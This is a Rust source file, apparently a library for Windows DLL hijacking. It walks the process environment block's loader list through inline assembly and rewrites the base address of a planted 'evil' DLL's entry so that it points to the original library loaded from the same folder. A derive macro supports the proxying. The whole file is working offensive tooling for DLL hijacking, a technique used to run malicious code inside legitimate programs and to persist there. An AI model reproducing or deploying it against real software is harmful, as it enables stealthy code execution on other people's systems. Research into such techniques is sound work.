use std::arch::asm;
use std::ffi::{c_ulong, c_void, OsString};
use std::mem::zeroed;
use std::os::windows::ffi::OsStrExt;
use std::ptr::addr_of_mut;
use std::str::FromStr;
use windows_sys::Win32::Foundation::{BOOLEAN, HANDLE, MAX_PATH, UNICODE_STRING};
use windows_sys::Win32::System::Kernel::LIST_ENTRY;
use windows_sys::Win32::System::LibraryLoader::{GetModuleFileNameW, LoadLibraryW};
use windows_sys::Win32::System::Threading::PEB;
use windows_sys::Win32::System::WindowsProgramming::uaw_wcsicmp;
use windows_sys::Win32::UI::Shell::{PathAppendW, PathRemoveFileSpecW};

pub use dll_hijack_derive::hijack;
pub use windows_sys::Win32::Foundation::{BOOL, HMODULE, TRUE};
pub use windows_sys::Win32::System::SystemServices::{
    DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH,
};

#[repr(C)]
struct PebLdrData {
    length: c_ulong,
    initialized: BOOLEAN,
    ss_handle: HANDLE,
    in_load_order_module_list: LIST_ENTRY,
    in_memory_order_module_list: LIST_ENTRY,
    in_initialization_order_module_list: LIST_ENTRY,
}

#[repr(C)]
struct LdrDataTableEntry {
    in_load_order_links: LIST_ENTRY,
    in_memory_order_module_list: LIST_ENTRY,
    in_initialization_order_module_list: LIST_ENTRY,
    dll_base: *mut c_void,
    entry_point: *mut c_void,
    size_of_image: c_ulong,
    full_dll_name: UNICODE_STRING,
    base_dll_name: UNICODE_STRING,
}

unsafe fn current_peb() -> *mut PEB {
    unsafe {
        let mut addr = zeroed();

        if cfg!(target_arch = "x86_64") {
            asm!("mov {}, gs:[0x60];", out(reg) addr);
        } else if cfg!(target_arch = "x86") {
            asm!("mov {}, fs:[0x30];", out(reg) addr);
        }

        addr
    }
}

unsafe fn super_dll_hijack(dll_name: *const u16, path: *const u16) {
    unsafe {
        let peb = current_peb();
        let ldr = (*peb).Ldr as *mut PebLdrData;
        let mut entry = (*ldr).in_load_order_module_list.Blink;

        loop {
            let mut data = entry as *mut LdrDataTableEntry;

            if uaw_wcsicmp((*data).base_dll_name.Buffer, dll_name) == 0 {
                let hmod = LoadLibraryW(path);
                (*data).dll_base = hmod as *mut c_void;
                break;
            }

            entry = (*entry).Blink;

            if entry == addr_of_mut!((*ldr).in_load_order_module_list) {
                break;
            }
        }
    }
}

pub fn dll_hijack(h_module: HMODULE, evil_dll_name: &str, orig_dll_name: &str) {
    let mut evil_dll_name: Vec<u16> = OsString::from_str(evil_dll_name)
        .unwrap()
        .encode_wide()
        .collect();
    let mut orig_dll_name: Vec<u16> = OsString::from_str(orig_dll_name)
        .unwrap()
        .encode_wide()
        .collect();

    evil_dll_name.push(0u16);
    orig_dll_name.push(0u16);

    let mut name = vec![0u16; usize::try_from(MAX_PATH).unwrap()];

    unsafe {
        GetModuleFileNameW(h_module, name.as_mut_ptr(), MAX_PATH);
        PathRemoveFileSpecW(name.as_mut_ptr());
        PathAppendW(name.as_mut_ptr(), orig_dll_name.as_mut_ptr());
        super_dll_hijack(evil_dll_name.as_mut_ptr(), name.as_mut_ptr())
    }
}
